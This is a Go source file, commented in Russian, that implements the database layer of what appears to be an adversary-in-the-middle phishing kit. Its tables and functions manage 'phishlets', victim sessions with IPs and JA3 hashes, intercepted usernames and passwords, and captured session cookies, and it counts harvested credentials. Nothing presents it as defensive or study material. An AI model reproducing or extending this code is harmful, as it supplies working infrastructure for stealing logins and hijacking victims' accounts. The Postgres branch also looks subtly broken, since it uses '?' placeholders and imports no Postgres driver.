// Package database provides database abstraction layer
package database

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
	"go.uber.org/zap"
)

// DatabaseType тип БД
type DatabaseType string

const (
	DatabaseSQLite   DatabaseType = "sqlite"
	DatabasePostgres DatabaseType = "postgres"
)

// DatabaseConfig конфигурация БД
type DatabaseConfig struct {
	Type        DatabaseType `json:"type"`
	SQLitePath  string       `json:"sqlite_path"`
	PostgresURL string       `json:"postgres_url"`
	MaxOpenConns int         `json:"max_open_conns"`
	MaxIdleConns int         `json:"max_idle_conns"`
	ConnMaxLifetime time.Duration `json:"conn_max_lifetime"`
}

// Database представляет подключение к базе данных
type Database struct {
	db     *sql.DB
	config *DatabaseConfig
	logger *zap.Logger
}

// DefaultConfig возвращает конфигурацию по умолчанию
func DefaultConfig() *DatabaseConfig {
	return &DatabaseConfig{
		Type:           DatabaseSQLite,
		SQLitePath:     "./phantom.db",
		MaxOpenConns:   25,
		MaxIdleConns:   5,
		ConnMaxLifetime: 5 * time.Minute,
	}
}

// NewDatabase создает новое подключение к БД
func NewDatabase(config *DatabaseConfig, logger *zap.Logger) (*Database, error) {
	if config == nil {
		config = DefaultConfig()
	}

	var db *sql.DB
	var err error

	switch config.Type {
	case DatabaseSQLite:
		db, err = sql.Open("sqlite3", config.SQLitePath)
	case DatabasePostgres:
		db, err = sql.Open("postgres", config.PostgresURL)
	default:
		return nil, fmt.Errorf("unsupported database type: %s", config.Type)
	}

	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	// Настройка пула подключений
	db.SetMaxOpenConns(config.MaxOpenConns)
	db.SetMaxIdleConns(config.MaxIdleConns)
	db.SetConnMaxLifetime(config.ConnMaxLifetime)

	// Проверка подключения
	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("failed to ping database: %w", err)
	}

	d := &Database{
		db:     db,
		config: config,
		logger: logger,
	}

	// Инициализация схемы
	if err := d.initSchema(); err != nil {
		return nil, fmt.Errorf("failed to initialize schema: %w", err)
	}

	logger.Info("Database initialized",
		zap.String("type", string(config.Type)))

	return d, nil
}

// initSchema инициализирует схему БД
func (d *Database) initSchema() error {
	schemas := d.getSchema()

	for _, schema := range schemas {
		_, err := d.db.Exec(schema)
		if err != nil {
			return fmt.Errorf("failed to execute schema: %w", err)
		}
	}

	return nil
}

// getSchema возвращает SQL схему в зависимости от типа БД
func (d *Database) getSchema() []string {
	switch d.config.Type {
	case DatabaseSQLite:
		return []string{
			`CREATE TABLE IF NOT EXISTS sessions (
				id TEXT PRIMARY KEY,
				victim_ip TEXT NOT NULL,
				target_url TEXT,
				phishlet_id TEXT,
				user_agent TEXT,
				ja3_hash TEXT,
				state TEXT DEFAULT 'active',
				created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
				last_active DATETIME DEFAULT CURRENT_TIMESTAMP
			)`,
			`CREATE TABLE IF NOT EXISTS credentials (
				id TEXT PRIMARY KEY,
				session_id TEXT,
				username TEXT,
				password TEXT,
				custom_fields TEXT,
				captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
				FOREIGN KEY (session_id) REFERENCES sessions(id)
			)`,
			`CREATE TABLE IF NOT EXISTS cookies (
				id TEXT PRIMARY KEY,
				session_id TEXT,
				name TEXT,
				value TEXT,
				domain TEXT,
				path TEXT,
				expires DATETIME,
				http_only BOOLEAN,
				secure BOOLEAN,
				same_site TEXT,
				FOREIGN KEY (session_id) REFERENCES sessions(id)
			)`,
			`CREATE TABLE IF NOT EXISTS phishlets (
				id TEXT PRIMARY KEY,
				name TEXT UNIQUE,
				config TEXT,
				enabled BOOLEAN DEFAULT false,
				created_at DATETIME DEFAULT CURRENT_TIMESTAMP
			)`,
			`CREATE INDEX IF NOT EXISTS idx_sessions_state ON sessions(state)`,
			`CREATE INDEX IF NOT EXISTS idx_credentials_session ON credentials(session_id)`,
		}

	case DatabasePostgres:
		return []string{
			`CREATE TABLE IF NOT EXISTS sessions (
				id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
				victim_ip INET NOT NULL,
				target_url TEXT,
				phishlet_id UUID,
				user_agent TEXT,
				ja3_hash TEXT,
				state TEXT DEFAULT 'active',
				created_at TIMESTAMPTZ DEFAULT NOW(),
				last_active TIMESTAMPTZ DEFAULT NOW()
			)`,
			`CREATE TABLE IF NOT EXISTS credentials (
				id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
				session_id UUID,
				username TEXT,
				password TEXT,
				custom_fields JSONB,
				captured_at TIMESTAMPTZ DEFAULT NOW(),
				FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
			)`,
			`CREATE TABLE IF NOT EXISTS cookies (
				id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
				session_id UUID,
				name TEXT,
				value TEXT,
				domain TEXT,
				path TEXT,
				expires TIMESTAMPTZ,
				http_only BOOLEAN,
				secure BOOLEAN,
				same_site TEXT,
				FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
			)`,
			`CREATE TABLE IF NOT EXISTS phishlets (
				id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
				name TEXT UNIQUE,
				config JSONB,
				enabled BOOLEAN DEFAULT false,
				created_at TIMESTAMPTZ DEFAULT NOW()
			)`,
			`CREATE INDEX IF NOT EXISTS idx_sessions_state ON sessions(state)`,
			`CREATE INDEX IF NOT EXISTS idx_credentials_session ON credentials(session_id)`,
			`CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON sessions(created_at)`,
		}

	default:
		return []string{}
	}
}

// Session представляет сессию жертвы
type Session struct {
	ID          string       `json:"id"`
	VictimIP    string       `json:"victim_ip"`
	TargetURL   string       `json:"target_url"`
	PhishletID  string       `json:"phishlet_id"`
	UserAgent   string       `json:"user_agent"`
	JA3Hash     string       `json:"ja3_hash"`
	State       string       `json:"state"`
	CreatedAt   time.Time    `json:"created_at"`
	LastActive  time.Time    `json:"last_active"`
	Credentials *Credentials `json:"credentials,omitempty"`
}

// Credentials представляет перехваченные учётные данные
type Credentials struct {
	ID           string            `json:"id"`
	SessionID    string            `json:"session_id"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	CustomFields map[string]string `json:"custom_fields"`
	CapturedAt   time.Time         `json:"captured_at"`
}

// Cookie представляет cookie сессии
type Cookie struct {
	ID        string    `json:"id"`
	SessionID string    `json:"session_id"`
	Name      string    `json:"name"`
	Value     string    `json:"value"`
	Domain    string    `json:"domain"`
	Path      string    `json:"path"`
	Expires   time.Time `json:"expires"`
	HTTPOnly  bool      `json:"http_only"`
	Secure    bool      `json:"secure"`
	SameSite  string    `json:"same_site"`
}

// Phishlet представляет конфигурацию phishlet
type Phishlet struct {
	ID        string    `json:"id"`
	Name      string    `json:"name"`
	Config    string    `json:"config"`
	Enabled   bool      `json:"enabled"`
	CreatedAt time.Time `json:"created_at"`
}

// CreateSession создает новую сессию
func (d *Database) CreateSession(session *Session) error {
	session.ID = uuid.New().String()
	session.CreatedAt = time.Now()
	session.LastActive = time.Now()

	query := `INSERT INTO sessions (id, victim_ip, target_url, phishlet_id, user_agent, ja3_hash, state, created_at, last_active)
			  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`

	_, err := d.db.Exec(query,
		session.ID,
		session.VictimIP,
		session.TargetURL,
		session.PhishletID,
		session.UserAgent,
		session.JA3Hash,
		session.State,
		session.CreatedAt,
		session.LastActive)

	return err
}

// GetSession получает сессию по ID
func (d *Database) GetSession(id string) (*Session, error) {
	query := `SELECT id, victim_ip, target_url, phishlet_id, user_agent, ja3_hash, state, created_at, last_active
			  FROM sessions WHERE id = ?`

	row := d.db.QueryRow(query, id)

	session := &Session{}
	err := row.Scan(
		&session.ID,
		&session.VictimIP,
		&session.TargetURL,
		&session.PhishletID,
		&session.UserAgent,
		&session.JA3Hash,
		&session.State,
		&session.CreatedAt,
		&session.LastActive)

	if err != nil {
		return nil, err
	}

	return session, nil
}

// UpdateSession обновляет сессию
func (d *Database) UpdateSession(session *Session) error {
	query := `UPDATE sessions SET victim_ip = ?, target_url = ?, phishlet_id = ?,
			  user_agent = ?, ja3_hash = ?, state = ?, last_active = ? WHERE id = ?`

	_, err := d.db.Exec(query,
		session.VictimIP,
		session.TargetURL,
		session.PhishletID,
		session.UserAgent,
		session.JA3Hash,
		session.State,
		time.Now(),
		session.ID)

	return err
}

// DeleteSession удаляет сессию
func (d *Database) DeleteSession(id string) error {
	_, err := d.db.Exec(`DELETE FROM sessions WHERE id = ?`, id)
	return err
}

// ListSessions получает список сессий
func (d *Database) ListSessions(limit, offset int) ([]*Session, error) {
	query := `SELECT id, victim_ip, target_url, phishlet_id, user_agent, ja3_hash, state, created_at, last_active
			  FROM sessions ORDER BY created_at DESC LIMIT ? OFFSET ?`

	rows, err := d.db.Query(query, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	sessions := make([]*Session, 0)
	for rows.Next() {
		session := &Session{}
		err := rows.Scan(
			&session.ID,
			&session.VictimIP,
			&session.TargetURL,
			&session.PhishletID,
			&session.UserAgent,
			&session.JA3Hash,
			&session.State,
			&session.CreatedAt,
			&session.LastActive)

		if err != nil {
			return nil, err
		}
		sessions = append(sessions, session)
	}

	return sessions, nil
}

// CreateCredentials создает учётные данные
func (d *Database) CreateCredentials(creds *Credentials) error {
	creds.ID = uuid.New().String()
	creds.CapturedAt = time.Now()

	customFieldsJSON, _ := json.Marshal(creds.CustomFields)

	query := `INSERT INTO credentials (id, session_id, username, password, custom_fields, captured_at)
			  VALUES (?, ?, ?, ?, ?, ?)`

	_, err := d.db.Exec(query,
		creds.ID,
		creds.SessionID,
		creds.Username,
		creds.Password,
		string(customFieldsJSON),
		creds.CapturedAt)

	return err
}

// GetCredentials получает учётные данные по ID
func (d *Database) GetCredentials(id string) (*Credentials, error) {
	query := `SELECT id, session_id, username, password, custom_fields, captured_at
			  FROM credentials WHERE id = ?`

	row := d.db.QueryRow(query, id)

	creds := &Credentials{}
	var customFieldsJSON string
	err := row.Scan(
		&creds.ID,
		&creds.SessionID,
		&creds.Username,
		&creds.Password,
		&customFieldsJSON,
		&creds.CapturedAt)

	if err != nil {
		return nil, err
	}

	json.Unmarshal([]byte(customFieldsJSON), &creds.CustomFields)

	return creds, nil
}

// ListCredentials получает список учётных данных
func (d *Database) ListCredentials(limit, offset int) ([]*Credentials, error) {
	query := `SELECT id, session_id, username, password, custom_fields, captured_at
			  FROM credentials ORDER BY captured_at DESC LIMIT ? OFFSET ?`

	rows, err := d.db.Query(query, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	credsList := make([]*Credentials, 0)
	for rows.Next() {
		creds := &Credentials{}
		var customFieldsJSON string
		err := rows.Scan(
			&creds.ID,
			&creds.SessionID,
			&creds.Username,
			&creds.Password,
			&customFieldsJSON,
			&creds.CapturedAt)

		if err != nil {
			return nil, err
		}

		json.Unmarshal([]byte(customFieldsJSON), &creds.CustomFields)
		credsList = append(credsList, creds)
	}

	return credsList, nil
}

// CreateCookie создает cookie
func (d *Database) CreateCookie(cookie *Cookie) error {
	cookie.ID = uuid.New().String()

	query := `INSERT INTO cookies (id, session_id, name, value, domain, path, expires, http_only, secure, same_site)
			  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`

	_, err := d.db.Exec(query,
		cookie.ID,
		cookie.SessionID,
		cookie.Name,
		cookie.Value,
		cookie.Domain,
		cookie.Path,
		cookie.Expires,
		cookie.HTTPOnly,
		cookie.Secure,
		cookie.SameSite)

	return err
}

// GetCookiesBySession получает cookies по сессии
func (d *Database) GetCookiesBySession(sessionID string) ([]*Cookie, error) {
	query := `SELECT id, session_id, name, value, domain, path, expires, http_only, secure, same_site
			  FROM cookies WHERE session_id = ?`

	rows, err := d.db.Query(query, sessionID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	cookies := make([]*Cookie, 0)
	for rows.Next() {
		cookie := &Cookie{}
		err := rows.Scan(
			&cookie.ID,
			&cookie.SessionID,
			&cookie.Name,
			&cookie.Value,
			&cookie.Domain,
			&cookie.Path,
			&cookie.Expires,
			&cookie.HTTPOnly,
			&cookie.Secure,
			&cookie.SameSite)

		if err != nil {
			return nil, err
		}
		cookies = append(cookies, cookie)
	}

	return cookies, nil
}

// CreatePhishlet создает phishlet
func (d *Database) CreatePhishlet(phishlet *Phishlet) error {
	phishlet.ID = uuid.New().String()
	phishlet.CreatedAt = time.Now()

	query := `INSERT INTO phishlets (id, name, config, enabled, created_at)
			  VALUES (?, ?, ?, ?, ?)`

	_, err := d.db.Exec(query,
		phishlet.ID,
		phishlet.Name,
		phishlet.Config,
		phishlet.Enabled,
		phishlet.CreatedAt)

	return err
}

// GetPhishlet получает phishlet по ID
func (d *Database) GetPhishlet(id string) (*Phishlet, error) {
	query := `SELECT id, name, config, enabled, created_at FROM phishlets WHERE id = ?`

	row := d.db.QueryRow(query, id)

	phishlet := &Phishlet{}
	err := row.Scan(&phishlet.ID, &phishlet.Name, &phishlet.Config, &phishlet.Enabled, &phishlet.CreatedAt)

	if err != nil {
		return nil, err
	}

	return phishlet, nil
}

// GetPhishletByName получает phishlet по имени
func (d *Database) GetPhishletByName(name string) (*Phishlet, error) {
	query := `SELECT id, name, config, enabled, created_at FROM phishlets WHERE name = ?`

	row := d.db.QueryRow(query, name)

	phishlet := &Phishlet{}
	err := row.Scan(&phishlet.ID, &phishlet.Name, &phishlet.Config, &phishlet.Enabled, &phishlet.CreatedAt)

	if err != nil {
		return nil, err
	}

	return phishlet, nil
}

// ListPhishlets получает список phishlets
func (d *Database) ListPhishlets() ([]*Phishlet, error) {
	query := `SELECT id, name, config, enabled, created_at FROM phishlets ORDER BY created_at`

	rows, err := d.db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	phishlets := make([]*Phishlet, 0)
	for rows.Next() {
		phishlet := &Phishlet{}
		err := rows.Scan(&phishlet.ID, &phishlet.Name, &phishlet.Config, &phishlet.Enabled, &phishlet.CreatedAt)

		if err != nil {
			return nil, err
		}
		phishlets = append(phishlets, phishlet)
	}

	return phishlets, nil
}

// EnablePhishlet включает phishlet
func (d *Database) EnablePhishlet(id string) error {
	_, err := d.db.Exec(`UPDATE phishlets SET enabled = true WHERE id = ?`, id)
	return err
}

// DisablePhishlet выключает phishlet
func (d *Database) DisablePhishlet(id string) error {
	_, err := d.db.Exec(`UPDATE phishlets SET enabled = false WHERE id = ?`, id)
	return err
}

// DeletePhishlet удаляет phishlet
func (d *Database) DeletePhishlet(id string) error {
	_, err := d.db.Exec(`DELETE FROM phishlets WHERE id = ?`, id)
	return err
}

// GetStats получает статистику
func (d *Database) GetStats() (map[string]interface{}, error) {
	stats := make(map[string]interface{})

	// Total sessions
	var totalSessions int
	err := d.db.QueryRow(`SELECT COUNT(*) FROM sessions`).Scan(&totalSessions)
	if err != nil {
		return nil, err
	}
	stats["total_sessions"] = totalSessions

	// Active sessions
	var activeSessions int
	err = d.db.QueryRow(`SELECT COUNT(*) FROM sessions WHERE state = 'active'`).Scan(&activeSessions)
	if err != nil {
		return nil, err
	}
	stats["active_sessions"] = activeSessions

	// Total credentials
	var totalCredentials int
	err = d.db.QueryRow(`SELECT COUNT(*) FROM credentials`).Scan(&totalCredentials)
	if err != nil {
		return nil, err
	}
	stats["total_credentials"] = totalCredentials

	// Total phishlets
	var totalPhishlets int
	err = d.db.QueryRow(`SELECT COUNT(*) FROM phishlets`).Scan(&totalPhishlets)
	if err != nil {
		return nil, err
	}
	stats["total_phishlets"] = totalPhishlets

	// Enabled phishlets
	var enabledPhishlets int
	err = d.db.QueryRow(`SELECT COUNT(*) FROM phishlets WHERE enabled = true`).Scan(&enabledPhishlets)
	if err != nil {
		return nil, err
	}
	stats["enabled_phishlets"] = enabledPhishlets

	return stats, nil
}

// Close закрывает подключение к БД
func (d *Database) Close() error {
	d.logger.Info("Database closed")
	return d.db.Close()
}

// Exec выполняет raw SQL запрос
func (d *Database) Exec(query string, args ...interface{}) (sql.Result, error) {
	return d.db.Exec(query, args...)
}

// Query выполняет raw SQL запрос с результатом
func (d *Database) Query(query string, args ...interface{}) (*sql.Rows, error) {
	return d.db.Query(query, args...)
}

// QueryRow выполняет raw SQL запрос с одной строкой
func (d *Database) QueryRow(query string, args ...interface{}) *sql.Row {
	return d.db.QueryRow(query, args...)
}

// Begin начинает транзакцию
func (d *Database) Begin() (*sql.Tx, error) {
	return d.db.Begin()
}

// Ping проверяет подключение к БД
func (d *Database) Ping() error {
	return d.db.Ping()
}

// GetDB возвращает raw sql.DB
func (d *Database) GetDB() *sql.DB {
	return d.db
}

// GetConfig возвращает конфигурацию
func (d *Database) GetConfig() *DatabaseConfig {
	return d.config
}

// Migrate выполняет миграции
func (d *Database) Migrate(ctx context.Context, migrations []string) error {
	for _, migration := range migrations {
		// Разделение на statements
		statements := strings.Split(migration, ";")
		for _, stmt := range statements {
			stmt = strings.TrimSpace(stmt)
			if stmt == "" {
				continue
			}

			if _, err := d.db.ExecContext(ctx, stmt); err != nil {
				return fmt.Errorf("migration failed: %w", err)
			}
		}
	}

	return nil
}
